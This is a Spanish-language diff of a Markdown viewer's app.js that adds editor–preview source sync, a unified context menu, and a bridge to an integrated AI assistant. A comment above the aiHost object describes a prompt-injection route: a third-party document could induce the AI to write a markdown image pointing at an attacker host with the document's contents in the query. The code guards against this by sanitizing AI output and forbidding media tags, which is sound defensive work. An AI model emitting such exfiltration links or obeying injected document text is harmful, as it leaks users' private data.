@@ -54,6 +54,9 @@
   var history      = [];
   var histIdx      = -1;
   var currentMathFormulas = [];
+  // Texto con el que se renderizó por última vez #content: permite saber si la
+  // preview está al día respecto al editor (RF-30).
+  var lastRenderedRaw = null;
 
   // Modo Edición (RF-20/RF-21)
   var editMode = false;
@@ -192,6 +195,10 @@
   // enabled:false deja los checkboxes con `disabled=""` — coherente con la app de solo lectura.
   if (window.markdownitTaskLists) md.use(window.markdownitTaskLists, { enabled: false });
   if (window.markdownitFootnote) md.use(window.markdownitFootnote);
+  // Anota cada bloque con su línea de origen (RF-30). Va la última de las reglas
+  // `core`, después de las alertas GFM, para ver los tokens ya definitivos.
+  if (!window.DBVSourceSync) { showError('[ERROR] sourcesync.js no cargado'); return; }
+  window.DBVSourceSync.annotate(md);
 
   // ─── Alertas GFM: > [!NOTE] / [!TIP] / [!IMPORTANT] / [!WARNING] / [!CAUTION] ──
   // markdown-it no soporta esta sintaxis de fábrica: sin esto la cita se
@@ -285,23 +292,40 @@
   // RF-03/ADR-009). Se sustituyen aquí por un placeholder de HTML crudo que
   // markdown-it (html:true) deja pasar intacto, y se rellenan de verdad en
   // processMath(), después del render + sanitizado.
-  var MATH_PROTECT_RE = / MATH_PROTECT_(\d+) /g;
+  // Se come también los saltos de línea que stash() deja detrás del marcador
+  // (ver más abajo): `nls` trae los que haya, y restoreCodeRegions() devuelve los
+  // que sobran. El marcador lleva un NUL a cada lado: no puede aparecer en un .md.
+  var MATH_PROTECT_RE = /\u0000MATH_PROTECT_(\d+)\u0000(\n*)/g;
+
+  function countNewlines(s) {
+    var n = 0;
+    for (var i = 0; i < s.length; i++) if (s.charCodeAt(i) === 10) n++;
+    return n;
+  }
 
   function protectCodeRegions(text) {
     var blocks = [];
+    var newlines = [];
+    // El marcador conserva el número de líneas de lo que esconde: así, mientras
+    // dura la extracción, las líneas del texto coinciden con las del fichero y
+    // se puede anotar en qué línea empezó cada fórmula (RF-30, ver extractMath).
     function stash(s) {
       blocks.push(s);
-      return ' MATH_PROTECT_' + (blocks.length - 1) + ' ';
+      var k = countNewlines(s);
+      newlines.push(k);
+      return '\u0000MATH_PROTECT_' + (blocks.length - 1) + '\u0000' + new Array(k + 1).join('\n');
     }
     // Bloques de código con fence (``` o ~~~, incluye ```math y ```mermaid).
     text = text.replace(/^( {0,3})(`{3,}|~{3,})[^\n]*\n[\s\S]*?^[ \t]{0,3}\2[ \t]*$/gm, stash);
     // Code spans inline (`code`).
     text = text.replace(/`+[^`\n]*`+/g, stash);
-    return { text: text, blocks: blocks };
+    return { text: text, blocks: blocks, newlines: newlines };
   }
 
-  function restoreCodeRegions(text, blocks) {
-    return text.replace(MATH_PROTECT_RE, function (_, i) { return blocks[Number(i)]; });
+  function restoreCodeRegions(text, blocks, newlines) {
+    return text.replace(MATH_PROTECT_RE, function (_, i, nls) {
+      return blocks[Number(i)] + nls.slice(newlines[Number(i)]);
+    });
   }
 
   function mathPlaceholder(latex, displayMode, formulas) {
@@ -312,11 +336,25 @@
 
   function extractMath(raw) {
     var formulas = [];
+    var rawFormulas = [];
     var protectedText = protectCodeRegions(raw);
     var text = protectedText.text;
+    // Línea del fichero en la que empieza el desplazamiento `pos`: los desplazamientos llegan en
+    // orden creciente, así que se cuenta desde el anterior (contarlo todo desde 0 en cada
+    // fórmula sería cuadrático en documentos con muchas).
+    var scannedTo = 0;
+    var scannedLines = 0;
+    function lineAtOffset(pos) {
+      for (; scannedTo < pos; scannedTo++) if (text.charCodeAt(scannedTo) === 10) scannedLines++;
+      return scannedLines;
+    }
 
     // Display: $$...$$ (antes del inline, que si no consumiría los $ sueltos).
-    text = text.replace(/(^|[^\\])\$\$([\s\S]+?)\$\$/g, function (m, pre, body) {
+    // Una fórmula en varias líneas pasa a ocupar UNA: se anota dónde empezaba y
+    // cuántos saltos se llevó, para devolver a markdown-it las líneas del fichero
+    // (RF-30: sin esto, todo bloque posterior apuntaría unas líneas más arriba).
+    text = text.replace(/(^|[^\\])\$\$([\s\S]+?)\$\$/g, function (m, pre, body, offset) {
+      rawFormulas.push({ rawLine: lineAtOffset(offset + pre.length), extra: countNewlines(body) });
       return pre + mathPlaceholder(body.trim(), true, formulas);
     });
     // Inline: $...$ — sin espacio pegado al delimitador; \$ escapa (no abre).
@@ -325,8 +363,8 @@
       return pre + mathPlaceholder(body, false, formulas);
     });
 
-    text = restoreCodeRegions(text, protectedText.blocks);
-    return { text: text, formulas: formulas };
+    text = restoreCodeRegions(text, protectedText.blocks, protectedText.newlines);
+    return { text: text, formulas: formulas, lineShifts: window.DBVSourceSync.buildShifts(rawFormulas) };
   }
 
   function renderKatex(latex, displayMode) {
@@ -469,6 +507,8 @@
           }
           // RF-25: la raíz del árbol de directorios sigue siempre al documento activo.
           if (window.DBVFileTree) window.DBVFileTree.onDocumentLoaded(doc);
+          // RF-31: la carpeta con la que trabaja la IA sigue al documento activo.
+          aiNotifyDocument();
         })
         .catch(function (err) {
           if (opts.isAutoRestore) {
@@ -528,6 +568,11 @@
     openDocument: function (path) { loadDocument(path, { isPrimaryOpen: true }); },
     isRemoteUrl: isRemoteUrl,
     setTocVisible: setTocVisible,
+    // RF-33: filetree.js avisa de que se pulsó la pestaña del Asistente; la carga y el contenido son de app.js.
+    openAssistant: function () { openAssistant(); },
+    // RF-33.2: el menú contextual del árbol ofrece «Añadir a la conversación» si las funciones de IA están a la vista.
+    aiAvailable: function () { return !isAndroid && aiState.showAi && !!aiRoot(); },
+    attachToAi: function (path) { attachToAi(path); },
     registerPanel: registerPanel,
     // RF-25 sobre SAF (Slice 2): filetree.js lista carpetas sin saber si la
     // raíz actual es una ruta de disco o un árbol `content://` — ver
@@ -603,13 +648,19 @@
   // documento en cada render con debounce mientras se escribe. `md.render()`
   // internamente ya hace `parse()` + `renderer.render()`; separarlos dos
   // líneas permite reutilizar los tokens sin cambiar el HTML resultante.
-  function renderMarkdown(raw, targetEl) {
+  // `untrusted` (la salida de la IA, ver aiHost.renderMarkdown más abajo): sin medios ni estilos.
+  // Se prohíben AL SANEAR, antes de crear ningún nodo: un <img src="https://…"> hace que el
+  // navegador pida la imagen en cuanto existe el elemento, aunque se sustituya después.
+  var UNTRUSTED_FORBID_TAGS = ['img', 'picture', 'video', 'audio', 'source', 'track', 'iframe', 'object', 'embed', 'link', 'style', 'svg', 'form'];
+  function renderMarkdown(raw, targetEl, untrusted) {
     targetEl = targetEl || contentEl;
     var extracted = extractMath(raw);
     currentMathFormulas = extracted.formulas;
-    var tokens = md.parse(extracted.text, {});
+    var tokens = md.parse(extracted.text, { lineShifts: extracted.lineShifts });
     var html = md.renderer.render(tokens, md.options, {});
-    html = window.DOMPurify.sanitize(html, { ADD_ATTR: ['id', 'class', 'name'] });
+    html = window.DOMPurify.sanitize(html, untrusted
+      ? { ADD_ATTR: ['id', 'class', 'name'], FORBID_TAGS: UNTRUSTED_FORBID_TAGS, FORBID_ATTR: ['style', 'srcset', 'background', 'poster'] }
+      : { ADD_ATTR: ['id', 'class', 'name'] });
     targetEl.innerHTML = html;
     // :not(.language-mermaid):not(.language-math) — esos bloques los sustituye
     // processMermaid()/processMath() por un SVG/KaTeX justo después, así que
@@ -626,6 +677,7 @@
     processMath(targetEl);
     interceptLinks(targetEl);
     if (targetEl === contentEl) {
+      lastRenderedRaw = raw;
       resolveImages(targetEl);
       buildToc();
       setupScrollSpy();
@@ -796,6 +848,14 @@
     actions.appendChild(btn);
   }
 
+  // Mermaid y KaTeX sustituyen el <pre> por otro elemento: el nuevo hereda la
+  // línea de origen para que un clic sobre él siga resolviendo al fuente (RF-30).
+  function copySourceMap(from, to) {
+    ['srcLine', 'srcEnd', 'srcBody'].forEach(function (key) {
+      if (from.dataset[key] !== undefined) to.dataset[key] = from.dataset[key];
+    });
+  }
+
   function processMermaid(container) {
     if (!window.mermaid) return;
     var blocks = container.querySelectorAll('pre code.language-mermaid');
@@ -808,12 +868,14 @@
           div.className = 'mermaid-container';
           div.innerHTML = result.svg;
           div.dataset.mermaidSource = code; // para el menú contextual "Abrir en mermaid.live"
+          copySourceMap(codeEl, div);
           pre.replaceWith(div);
         })
         .catch(function (e) {
           console.warn('Mermaid:', e);
           var div = document.createElement('div');
           div.className = 'mermaid-error';
+          copySourceMap(codeEl, div);
           var title = document.createElement('strong');
           title.textContent = t('mermaid.error');
           var msg = document.createElement('pre');
@@ -840,6 +902,7 @@
         var div = document.createElement('div');
         div.className = 'katex-display-block';
         div.innerHTML = renderKatex(codeEl.innerText, true);
+        copySourceMap(codeEl, div);
         pre.replaceWith(div);
       } catch (e) { console.warn('KaTeX:', e); }
     });
@@ -1196,26 +1259,9 @@
     return 'https://mermaid.live/edit#pako:' + uint8ToUrlSafeBase64(compressed);
   }
 
-  var mermaidMenu = document.getElementById('mermaid-context-menu');
-  var mermaidMenuSource = null;
-
-  function hideMermaidMenu() { mermaidMenu.classList.add('hidden'); }
-
-  contentEl.addEventListener('contextmenu', function (e) {
-    var container = e.target.closest('.mermaid-container');
-    if (!container) { hideMermaidMenu(); return; }
-    e.preventDefault();
-    mermaidMenuSource = container.dataset.mermaidSource || null;
-    mermaidMenu.style.left = e.clientX + 'px';
-    mermaidMenu.style.top = e.clientY + 'px';
-    mermaidMenu.classList.remove('hidden');
-  });
-  document.addEventListener('click', hideMermaidMenu);
-  document.addEventListener('keydown', function (e) { if (e.key === 'Escape') hideMermaidMenu(); });
-  document.getElementById('mermaid-open-live').addEventListener('click', function () {
-    if (mermaidMenuSource) openExternal(buildMermaidLiveUrl(mermaidMenuSource));
-    hideMermaidMenu();
-  });
+  // "Abrir en mermaid.live" ya no tiene menú propio: es una entrada más del menú
+  // contextual de la previsualización (RF-30.5, ver "Sincronización edición ↔
+  // previsualización" más abajo), que se arma con lo aplicable al punto pulsado.
 
   // =========================================================================
   // Acerca de
@@ -2275,6 +2321,279 @@
   });
 
   // =========================================================================
+  // Sincronización edición ↔ previsualización por posición de origen (RF-30)
+  // =========================================================================
+  // La lógica pura (mapa de líneas, bloque más interno, palabra) está en
+  // sourcesync.js y se prueba en Node; aquí solo el cableado con el DOM. Solo se
+  // garantiza el BLOQUE: la palabra pulsada es una mejora de mejor esfuerzo.
+
+  var SYNC_FLASH_MS = 1400;
+  var Sync = window.DBVSourceSync;
+
+  // Aviso breve y no bloqueante (la app no tenía ninguno: los errores iban a un
+  // panel o a la consola). Lo usan también las acciones de la IA.
+  var toastTimer = null;
+  function showToast(message, tone) {
+    var el = document.getElementById('app-toast');
+    if (!el) {
+      el = document.createElement('div');
+      el.id = 'app-toast';
+      el.setAttribute('role', 'status');
+      el.setAttribute('aria-live', 'polite');
+      document.body.appendChild(el);
+    }
+    el.textContent = message;
+    el.className = 'app-toast' + (tone === 'error' ? ' app-toast-error' : '');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function () { el.className = 'app-toast hidden'; }, 4200);
+  }
+
+  /** ¿Se puede editar el documento abierto? No en Android, sin documento ni en remotos (RF-20). */
+  function canEditHere() { return !isAndroid && !!currentDoc && !isRemoteDoc(currentDoc); }
+
+  /** Repinta #content con lo que hay en el editor si el debounce de escritura aún no lo hizo (RF-30.6). */
+  function flushPendingRender() {
+    // `.value` de un <textarea> normaliza CRLF a LF; el texto renderizado de un documento
+    // de Windows puede traer CRLF: sin normalizar, parecería siempre desfasado.
+    var rendered = lastRenderedRaw == null ? null : lastRenderedRaw.replace(/\r\n/g, '\n');
+    if (editorTextarea.value === rendered) return false;
+    clearTimeout(editDebounceTimer);
+    updateHeadingAnchors(renderMarkdown(editorTextarea.value));
+    return true;
+  }
+
+  /**
+   * Bloque de la preview bajo `target`: la línea de código exacta si es un bloque
+   * de código; si no, el elemento anotado más interno; y si el clic cae fuera de
+   * todo (HTML embebido, un margen), el anotado anterior más cercano.
+   */
+  function blockAtPoint(target) {
+    if (!target || !contentEl.contains(target)) return null;
+    var codeLine = target.closest('.code-line');
+    var code = codeLine && codeLine.closest('[data-src-body]');
+    if (code && contentEl.contains(code)) {
+      var line = Number(code.dataset.srcBody) + Number(codeLine.dataset.line) - 1;
+      return { el: codeLine, start: line, end: line + 1, exact: true };
+    }
+    var el = target.closest('[data-src-line]');
+    if (el && contentEl.contains(el)) return { el: el, start: Number(el.dataset.srcLine), end: Number(el.dataset.srcEnd) };
+    var all = contentEl.querySelectorAll('[data-src-line]');
+    var previous = null;
+    for (var i = 0; i < all.length; i++) {
+      if (all[i].contains(target)) continue;
+      if (all[i].compareDocumentPosition(target) & Node.DOCUMENT_POSITION_FOLLOWING) previous = all[i];
+      else break;
+    }
+    return previous ? { el: previous, start: Number(previous.dataset.srcLine), end: Number(previous.dataset.srcEnd) } : null;
+  }
+
+  /** Palabra que el doble clic dejó seleccionada y cuántas veces apareció ya antes en el bloque. */
+  function selectedWordIn(blockEl) {
+    var sel = window.getSelection();
+    if (!sel || sel.isCollapsed || !sel.rangeCount) return null;
+    var word = Sync.wordOf(sel.toString());
+    var range = sel.getRangeAt(0);
+    if (!word || !blockEl.contains(range.startContainer)) return null;
+    var before = document.createRange();
+    before.setStart(blockEl, 0);
+    before.setEnd(range.startContainer, range.startOffset);
+    return { word: word, n: Sync.countWord(before.toString(), word) };
+  }
+
+  function flashBlock(el) {
+    el.classList.remove('sync-flash');
+    void el.offsetWidth; // reinicia la animación si se repite sobre el mismo bloque
+    el.classList.add('sync-flash');
+    setTimeout(function () { el.classList.remove('sync-flash'); }, SYNC_FLASH_MS);
+  }
+
+  /** Lleva el cursor del editor al bloque (y a la palabra, si se pudo localizar). */
+  function revealInEditor(block, word) {
+    var text = editorTextarea.value;
+    var range = (word && !block.exact) ? Sync.pickWordRange(text, block.start, block.end, word.word, word.n) : null;
+    if (!range) range = Sync.lineRange(text, block.start);
+    editorTextarea.focus({ preventScroll: true });
+    editorTextarea.setSelectionRange(range.from, range.to);
+    var line = Sync.lineOfOffset(text, range.from);
+    // Con el cerrojo, el scroll del editor no arrastra a la preview de vuelta.
+    withScrollLock(editorTextarea, function () {
+      var lh = editorLineHeightPx();
+      editorTextarea.scrollTop = Math.max(0, line * lh - (editorTextarea.clientHeight - lh) / 2);
+    });
+  }
+
+  /** Doble clic o «Ir al código aquí» sobre la preview, ya en Modo Edición (RF-30.2). */
+  function goToSourceAt(x, y, target, known) {
+    var stale = flushPendingRender();
+    // Si se repintó, el elemento pulsado ya no existe: se vuelve a resolver el punto.
+    if (stale) target = document.elementFromPoint(x, y);
+    var block = (known && !stale) ? known.block : blockAtPoint(target);
+    if (!block) { showToast(t('sync.notFound'), 'error'); return; }
+    var word = stale ? null : (known ? known.word : selectedWordIn(block.el));
+    revealInEditor(block, word);
+    flashBlock(block.el);
+  }
+
+  /** «Editar aquí» sobre la preview en modo lectura: entra en Modo Edición en ese punto (RF-30.4). */
+  function editHereAt(known) {
+    if (!canEditHere() || !known.block) return;
+    setEditMode(true);
+    revealInEditor(known.block, known.word);
+    flashBlock(known.block.el);
+  }
+
+  contentEl.addEventListener('dblclick', function (e) {
+    // En lectura el doble clic sigue seleccionando una palabra para copiarla (RF-30.4).
+    if (!editMode || e.target.closest('a, button, .code-actions')) return;
+    goToSourceAt(e.clientX, e.clientY, e.target, null);
+  });
+
+  /** Lleva la preview al bloque que contiene la línea del cursor del editor (RF-30.3). */
+  function goToPreviewFromEditor() {
+    if (!editMode) return;
+    flushPendingRender();
+    var el = previewElementForLine(Sync.lineOfOffset(editorTextarea.value, editorTextarea.selectionStart));
+    if (el) revealInPreview(el);
+    else showToast(t('sync.notFound'), 'error');
+  }
+
+  /** Elemento de la preview que contiene la línea `line` del fuente (la línea exacta en un bloque de código), o `null`. */
+  function previewElementForLine(line) {
+    var els = contentEl.querySelectorAll('[data-src-line]');
+    var blocks = [].map.call(els, function (el) {
+      var depth = 0;
+      for (var n = el.parentElement; n && n !== contentEl; n = n.parentElement) if (n.hasAttribute('data-src-line')) depth++;
+      return { start: Number(el.dataset.srcLine), end: Number(el.dataset.srcEnd), depth: depth };
+    });
+    var idx = Sync.pickBlock(blocks, line);
+    var found = idx < 0 ? null : els[idx];
+    if (found && found.dataset.srcBody !== undefined) {
+      var inCode = found.querySelector('.code-line[data-line="' + (line - Number(found.dataset.srcBody) + 1) + '"]');
+      if (inCode) found = inCode;
+    }
+    return found;
+  }
+
+  /** Centra `el` en la preview (o lo alinea arriba si es muy alto) sin que la sincronía de scroll arrastre al editor. */
+  function revealInPreview(el) {
+    withScrollLock(contentEl, function () {
+      var rect = el.getBoundingClientRect();
+      var top = contentEl.scrollTop + (rect.top - contentEl.getBoundingClientRect().top);
+      var offset = rect.height > contentEl.clientHeight * 0.8 ? 24 : (contentEl.clientHeight - rect.height) / 2;
+      contentEl.scrollTop = Math.max(0, top - offset);
+    });
+    flashBlock(el);
+  }
+
+  // ─── Menús contextuales (RF-30.3, RF-30.5) ────────────────────────────────
+  // Un solo constructor para el de la preview y el del editor: cada uno decide
+  // qué entradas son aplicables al punto pulsado. Las entradas de otros módulos
+  // (la IA en línea, RF-36) se añaden con DBVHost.registerEditorMenu().
+
+  var ctxMenuEl = null;
+  var editorMenuProviders = [];
+
+  function closeContextMenu() {
+    if (!ctxMenuEl) return;
+    ctxMenuEl.remove();
+    ctxMenuEl = null;
+  }
+
+  function openContextMenu(items, x, y) {
+    closeContextMenu();
+    var menu = document.createElement('div');
+    menu.className = 'ctx-menu';
+    menu.setAttribute('role', 'menu');
+    items.forEach(function (item) {
+      if (item.separator) {
+        var rule = document.createElement('div');
+        rule.className = 'ctx-sep';
+        rule.setAttribute('role', 'separator');
+        menu.appendChild(rule);
+        return;
+      }
+      var button = document.createElement('button');
+      button.type = 'button';
+      button.className = 'ctx-item';
+      button.setAttribute('role', 'menuitem');
+      button.dataset.action = item.id;
+      button.disabled = item.enabled === false;
+      var label = document.createElement('span');
+      label.textContent = item.label;
+      button.appendChild(label);
+      if (item.hint) {
+        var hint = document.createElement('span');
+        hint.className = 'ctx-hint';
+        hint.textContent = item.hint;
+        button.appendChild(hint);
+      }
+      button.addEventListener('click', function () { closeContextMenu(); item.run(); });
+      menu.appendChild(button);
+    });
+    document.body.appendChild(menu);
+    var size = menu.getBoundingClientRect();
+    menu.style.left = Math.max(4, Math.min(x, window.innerWidth - size.width - 4)) + 'px';
+    menu.style.top = Math.max(4, Math.min(y, window.innerHeight - size.height - 4)) + 'px';
+    ctxMenuEl = menu;
+    var first = menu.querySelector('.ctx-item:not(:disabled)');
+    if (first) first.focus();
+  }
+
+  document.addEventListener('mousedown', function (e) { if (ctxMenuEl && !ctxMenuEl.contains(e.target)) closeContextMenu(); });
+  document.addEventListener('keydown', function (e) { if (e.key === 'Escape') closeContextMenu(); });
+  contentEl.addEventListener('scroll', closeContextMenu);
+  editorTextarea.addEventListener('scroll', closeContextMenu);
+
+  contentEl.addEventListener('contextmenu', function (e) {
+    var items = [];
+    // Lo que depende del punto pulsado se resuelve YA: al elegir la entrada, el
+    // clic puede haber colapsado la selección de la que sale la palabra.
+    var block = blockAtPoint(e.target);
+    var known = { block: block, word: block ? selectedWordIn(block.el) : null };
+    var x = e.clientX;
+    var y = e.clientY;
+    if (canEditHere() && block) {
+      items.push(editMode
+        ? { id: 'goToSource', label: t('ctx.goToSource'), hint: t('ctx.doubleClick'), run: function () { goToSourceAt(x, y, e.target, known); } }
+        : { id: 'editHere', label: t('ctx.editHere'), run: function () { editHereAt(known); } });
+    }
+    var selection = window.getSelection();
+    if (selection && !selection.isCollapsed) items.push({ id: 'copy', label: t('ctx.copy'), run: function () { document.execCommand('copy'); } });
+    var diagram = e.target.closest('.mermaid-container');
+    if (diagram && diagram.dataset.mermaidSource) {
+      items.push({ id: 'mermaidLive', label: t('mermaid.openLive'), run: function () { openExternal(buildMermaidLiveUrl(diagram.dataset.mermaidSource)); } });
+    }
+    // Sin nada que ofrecer, se deja el menú nativo del WebView.
+    if (items.length) {
+      e.preventDefault();
+      openContextMenu(items, x, y);
+    } else closeContextMenu();
+  });
+
+  editorTextarea.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+    var hasSelection = editorTextarea.selectionStart !== editorTextarea.selectionEnd;
+    var items = [
+      { id: 'goToPreview', label: t('ctx.goToPreview'), hint: 'Ctrl+Alt+P', run: goToPreviewFromEditor },
+      { separator: true },
+      { id: 'cut', label: t('ctx.cut'), enabled: hasSelection, run: function () { editorTextarea.focus(); document.execCommand('cut'); } },
+      { id: 'copy', label: t('ctx.copy'), enabled: hasSelection, run: function () { editorTextarea.focus(); document.execCommand('copy'); } },
+      { id: 'paste', label: t('ctx.paste'), run: function () {
+        // insertText (y no .value=) conserva el deshacer nativo del textarea.
+        navigator.clipboard.readText()
+          .then(function (text) { editorTextarea.focus(); document.execCommand('insertText', false, text); })
+          .catch(function () { showToast(t('ctx.clipboardDenied'), 'error'); });
+      } },
+      { id: 'selectAll', label: t('ctx.selectAll'), run: function () { editorTextarea.focus(); editorTextarea.select(); } }
+    ];
+    editorMenuProviders.forEach(function (provider) {
+      var extra = provider({ hasSelection: hasSelection }) || [];
+      if (extra.length) items = items.concat([{ separator: true }], extra);
+    });
+    openContextMenu(items, e.clientX, e.clientY);
+  });
+
+  // =========================================================================
   // Barra de formato Markdown (RF-23) + indentación con Tab (RF-24)
   // =========================================================================
 
@@ -2597,16 +2916,295 @@
   });
 
   // =========================================================================
+  // IA integrada (RF-31 a RF-36) — puente con los módulos perezosos de src/ai/
+  // =========================================================================
+  // Este script (clásico, IIFE) solo sabe lo imprescindible de la IA: si hay
+  // una conectada y si el usuario quiere verla (una lectura de un fichero local).
+  // Nada de `src/ai/` se descarga hasta que el usuario pulsa el botón del
+  // Asistente, usa su atajo, o abre un menú que ofrece la IA en línea y ya hay una
+  // IA conectada (RNF-IA.1). Solo escritorio: en Android no hay Modo Edición.
+
+  var AI_PANEL_MIN_WIDTH = 360;
+  var btnAi = document.getElementById('btn-ai');
+  var tabAi = document.getElementById('tab-ai');
+  var aiPanelEl = document.getElementById('ai-panel');
+  var aiState = { showAi: true, connected: false };
+  var aiApp = null;
+  var aiLoading = null;
+
+  /** Carpeta del documento abierto, que es con lo que trabaja la IA (RNF-IA.3); `null` sin documento local. */
+  function aiRoot() {
+    if (isAndroid || !currentDoc || isRemoteDoc(currentDoc) || isSafUri(currentDoc.path) || !currentDoc.dir_path) return null;
+    // El prefijo `\\?\` de la ruta canónica de Windows no lo entienden los agentes ni sus rutas absolutas.
+    return currentDoc.dir_path.replace(/^\\\\\?\\UNC\\/i, '\\\\').replace(/^\\\\\?\\/, '');
+  }
+
+  /** Texto del documento abierto: el del editor si se está editando, si no el cargado. */
+  function aiOpenText() { return editMode ? editorTextarea.value : (currentDoc ? currentDoc.content : ''); }
+
+  function refreshAiVisibility() {
+    var visible = !isAndroid && aiState.showAi;
+    btnAi.classList.toggle('hidden', !visible);
+    tabAi.classList.toggle('hidden', !visible);
+    // Con las funciones ocultas, si el Asistente estaba a la vista se vuelve al Índice.
+    if (!visible && window.DBVFileTree && tabAi.classList.contains('active')) window.DBVFileTree.setActiveTab('index');
+  }
+
+  function sameDocName(relative) {
+    if (!currentDoc || typeof relative !== 'string') return false;
+    var a = relative.replace(/\\/g, '/');
+    var b = currentDoc.file_name;
+    // Windows y macOS no distinguen mayúsculas en los nombres de fichero.
+    return /Win|Mac/i.test(navigator.platform || navigator.userAgent) ? a.toLowerCase() === b.toLowerCase() : a === b;
+  }
+
+  /** Une la carpeta del documento con una ruta relativa, con el separador de esa carpeta. */
+  function aiJoin(dir, relative) {
+    var sep = dir.indexOf('\\') !== -1 ? '\\' : '/';
+    return dir.replace(/[\\/]+$/, '') + sep + relative.replace(/[\\/]/g, sep);
+  }
+
+  /** Encabezado visible y el texto hasta el siguiente: lo que adjunta «Adjuntar la sección visible» (RF-33.2). */
+  function aiVisibleSection() {
+    if (!currentDoc) return null;
+    var raw = lastRenderedRaw != null ? lastRenderedRaw : aiOpenText();
+    var headings = [].slice.call(contentEl.querySelectorAll('h1, h2, h3, h4, h5, h6')).filter(function (h) { return h.dataset.srcLine !== undefined; });
+    var hostTop = contentEl.getBoundingClientRect().top;
+    var current = null;
+    for (var i = 0; i < headings.length; i++) {
+      if (headings[i].getBoundingClientRect().top - hostTop <= 80) current = i; else break;
+    }
+    var lines = raw.split('\n');
+    var text;
+    var title;
+    if (current === null) {
+      title = currentDoc.file_name;
+      text = raw.slice(0, 6000);
+    } else {
+      var start = Number(headings[current].dataset.srcLine);
+      var end = current + 1 < headings.length ? Number(headings[current + 1].dataset.srcLine) : lines.length;
+      title = headings[current].textContent.trim();
+      text = lines.slice(start, end).join('\n').slice(0, 6000);
+    }
+    return text.trim() ? { title: title, text: text } : null;
+  }
+
+  function aiConnectModalCtl() {
+    if (!aiConnectModalCtl.ctl) {
+      var modal = document.getElementById('ai-connect-modal');
+      aiConnectModalCtl.ctl = registerPanel(modal, {});
+      document.getElementById('ai-connect-close').addEventListener('click', aiConnectModalCtl.ctl.close);
+      document.getElementById('ai-connect-backdrop').addEventListener('click', aiConnectModalCtl.ctl.close);
+    }
+    return aiConnectModalCtl.ctl;
+  }
+
+  /** Confirmación modal con botones propios (aviso de nube, borrar conversación). Resuelve con la `key` elegida. */
+  function aiConfirm(options) {
+    return new Promise(function (resolve) {
+      var modal = document.getElementById('ai-confirm-modal');
+      var actions = document.getElementById('ai-confirm-actions');
+      document.getElementById('ai-confirm-title').textContent = options.title || '';
+      document.getElementById('ai-confirm-text').textContent = options.text || '';
+      actions.innerHTML = '';
+      function finish(key) {
+        modal.classList.add('hidden');
+        document.removeEventListener('keydown', onKey, true);
+        resolve(key);
+      }
+      function onKey(e) {
+        if (e.key === 'Escape') { e.stopPropagation(); finish('cancel'); }
+      }
+      options.choices.forEach(function (choice) {
+        var b = document.createElement('button');
+        b.type = 'button';
+        b.className = 'button button--compact' + (choice.tone === 'primary' ? ' button--primary' : choice.tone === 'danger' ? ' button--danger' : '');
+        b.textContent = choice.label;
+        b.addEventListener('click', function () { finish(choice.key); });
+        actions.appendChild(b);
+      });
+      document.getElementById('ai-confirm-backdrop').onclick = function () { finish('cancel'); };
+      document.addEventListener('keydown', onKey, true);
+      modal.classList.remove('hidden');
+      var last = actions.lastElementChild;
+      if (last) last.focus();
+    });
+  }
+
+  /** Reemplaza TODO el texto del editor con una edición deshacible (Ctrl+Z) y deja el documento «Modificado». */
+  function aiReplaceEditorText(text) {
+    editorTextarea.focus({ preventScroll: true });
+    editorTextarea.select();
+    var done = document.execCommand('insertText', false, text);
+    if (!done || editorTextarea.value.replace(/\r\n/g, '\n') !== text.replace(/\r\n/g, '\n')) {
+      // Sin execCommand el cambio sigue valiendo, solo que Ctrl+Z no lo deshace.
+      editorTextarea.value = text;
+      editorTextarea.dispatchEvent(new Event('input', { bubbles: true }));
+    }
+    return true;
+  }
+
+  // Lo que dice la IA se pinta con el mismo render que un documento, que admite `<img src="https://…">`.
+  // Un `.md` de un tercero puede inducir a la IA a escribir `![x](https://atacante/?q=<contenido>)`:
+  // pintar esa respuesta enviaría el dato fuera sin que nadie lo apruebe (exfiltración por imagen
+  // markdown, RNF-IA.2/6). Por eso `aiHost.renderMarkdown` sanea en modo `untrusted`: sin medios, sin
+  // estilos. Los enlaces (`<a>`) siguen valiendo: solo se abren con un clic del usuario.
+
+  /** Lo que la IA sabe de la app: el documento, el editor y la interfaz (ver `src/ai/aiApp.js`). */
+  var aiHost = {
+    elements: { panel: aiPanelEl, connectBody: document.getElementById('ai-connect-body'), editorOverlay: document.getElementById('editor-overlay') },
+    toast: showToast,
+    confirm: aiConfirm,
+    renderMarkdown: function (target, markdown) {
+      target.classList.add('markdown-body');
+      renderMarkdown(markdown, target, true);
+    },
+    getFolderName: function () { var r = aiRoot(); return r ? r.split(/[\\/]/).filter(Boolean).pop() || '' : ''; },
+    getActive: function () {
+      if (!aiRoot()) return null;
+      var selection = '';
+      if (editMode) selection = editorTextarea.value.slice(editorTextarea.selectionStart, editorTextarea.selectionEnd);
+      else {
+        var sel = window.getSelection();
+        if (sel && !sel.isCollapsed && contentEl.contains(sel.anchorNode)) selection = sel.toString();
+      }
+      return { relative: currentDoc.file_name, content: aiOpenText(), cursor: editMode ? editorTextarea.selectionStart : 0, selection: selection };
+    },
+    isOpenDocument: sameDocName,
+    getOpenText: aiOpenText,
+    isDirty: function () { return isDirty; },
+    getOutline: function () {
+      return [].slice.call(contentEl.querySelectorAll('h1, h2, h3, h4, h5, h6')).map(function (h) {
+        return { level: Number(h.tagName.charAt(1)), text: h.textContent.trim() };
+      });
+    },
+    getVisibleSection: aiVisibleSection,
+    openDocument: function (relative) { if (currentDoc && currentDoc.dir_path) loadDocument(aiJoin(currentDoc.dir_path, relative), { isPrimaryOpen: true }); },
+    applyToEditor: function (text) { if (!canEditHere()) return false; if (!editMode) setEditMode(true); return aiReplaceEditorText(text); },
+    insertAtCursor: function (text) {
+      if (!canEditHere()) return false;
+      if (!editMode) setEditMode(true);
+      editorTextarea.focus({ preventScroll: true });
+      return document.execCommand('insertText', false, text);
+    },
+    /** Selección del editor para la IA en línea; solo en Modo Edición. */
+    getEditorSelection: function () {
+      if (!editMode) return null;
+      return { from: editorTextarea.selectionStart, to: editorTextarea.selectionEnd, text: editorTextarea.value.slice(editorTextarea.selectionStart, editorTextarea.selectionEnd), value: editorTextarea.value };
+    },
+    /** Sustituye [from, to) por `text` (deshacible) solo si el texto sigue siendo `expected`. */
+    replaceRange: function (from, to, text, expected) {
+      if (!editMode || editorTextarea.value.slice(from, to) !== expected) return false;
+      editorTextarea.focus({ preventScroll: true });
+      editorTextarea.setSelectionRange(from, to);
+      return document.execCommand('insertText', false, text);
+    },
+    showPanel: function (open) {
+      if (open) {
+        setTocVisible(true);
